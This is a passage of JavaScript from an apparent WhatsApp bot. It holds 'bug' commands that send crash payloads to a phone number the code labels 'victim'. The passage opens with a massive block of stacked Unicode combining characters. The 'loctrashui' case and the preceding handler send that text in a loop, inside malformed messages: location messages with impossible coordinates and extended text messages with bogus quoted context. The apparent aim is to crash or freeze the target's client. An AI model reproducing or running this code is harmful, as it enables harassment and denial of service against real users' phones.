̧̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̈̓͐͑̾̐̇̈̃̑͆͘͜͜͜͜ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅ`
      commet: xtext,
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(7000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "loctrashui":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 10
for (let i = 0; i < amount; i++){
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: xtext,
      address: '̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̛̱̠͍̟̺̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̕̕̕̚͘̕̕͘͝͠͠͝͝͝͠͠͠͠